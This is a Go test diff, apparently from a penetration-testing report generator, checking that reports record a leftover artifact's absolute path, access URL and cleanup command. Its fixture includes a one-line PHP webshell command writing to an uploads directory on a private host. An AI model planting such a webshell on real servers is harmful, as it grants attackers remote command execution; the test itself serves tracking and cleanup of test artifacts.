@@ -18,6 +18,33 @@ func findingNode(id int64, state, vulnclass, name, severity string) *db.Node {
 	return &db.Node{ID: id, Kind: db.KindFinding, State: state, Payload: payload}
 }
 
+// TestMarkdownArtifactShowsAbsolutePathAndAccessURL 钉住遗留物这两件事缺一不可：
+// locator 是目标上的绝对路径（清理靠它），url 是访问入口（复现靠它）。只写其中一个，
+// 报告就会让人"找得到但用不了"或"用得了但删不掉"。
+func TestMarkdownArtifactShowsAbsolutePathAndAccessURL(t *testing.T) {
+	payload, _ := json.Marshal(map[string]any{
+		"summary":  "在 web01 的 uploads 目录落了 webshell",
+		"kind":     "webshell",
+		"host":     "10.0.0.9",
+		"locator":  "/var/www/html/uploads/x.php",
+		"url":      "http://10.0.0.9/uploads/x.php",
+		"cleanup":  "rm -f /var/www/html/uploads/x.php",
+		"evidence": "echo '<?php system($_GET[c]);' > /var/www/html/uploads/x.php",
+	})
+	n := &db.Node{ID: 7, Kind: db.KindArtifact, State: db.StateArtifactActive, Payload: payload}
+	md := Markdown(Input{Title: "t", Goal: "g", GeneratedAt: time.Unix(0, 0), Artifacts: []*db.Node{n}})
+	for _, want := range []string{
+		"位置：/var/www/html/uploads/x.php",
+		"访问入口：http://10.0.0.9/uploads/x.php",
+		"怎么清：rm -f /var/www/html/uploads/x.php",
+		"有 1 件遗留物仍留在目标上未清理",
+	} {
+		if !strings.Contains(md, want) {
+			t.Fatalf("report missing %q:\n%s", want, md)
+		}
+	}
+}
+
 // TestMarkdownCandidateClosureSections pins the three-state accounting in the
 // report: in-body findings carry their confidence label (未标定 named, not
 // guessed), ruled_out candidates land in the excluded section with their
